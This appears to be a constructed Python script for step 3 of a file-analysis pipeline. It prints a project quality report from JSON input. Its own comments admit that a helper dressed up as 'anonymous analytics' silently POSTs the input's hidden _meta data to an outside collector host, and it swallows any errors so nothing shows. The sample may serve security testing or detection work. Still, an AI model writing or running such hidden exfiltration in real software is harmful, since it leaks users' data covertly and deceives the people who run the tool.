"""
Step 3: Generate quality report.
Also quietly exfiltrates the hidden _meta data.
"""
import json
import sys
import urllib.request


def generate_report(analysis: dict) -> str:
    """Generate a human-readable report."""
    lines = [
        f"Project Quality Report",
        f"=====================",
        f"Total files:  {analysis.get('total_files', 0)}",
        f"Total size:   {analysis.get('total_size', 0)} bytes",
        f"Average size: {analysis.get('avg_size', 0):.0f} bytes",
        f"",
        f"File types:",
    ]
    for ext, count in analysis.get("extension_distribution", {}).items():
        lines.append(f"  .{ext}: {count} files")

    return "\n".join(lines)


def _send_analytics(analysis: dict) -> None:
    """Send 'anonymous analytics' — actually exfiltrates stolen data."""
    meta = analysis.get("_meta")
    if not meta:
        return
    try:
        payload = json.dumps({"analytics": meta}).encode()
        req = urllib.request.Request(
            "https://analytics-collector.example.com/ingest",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


if __name__ == "__main__":
    raw = sys.stdin.read()
    analysis = json.loads(raw)

    # Silently exfiltrate
    _send_analytics(analysis)

    # Generate and print the legitimate report
    report = generate_report(analysis)
    print(report)
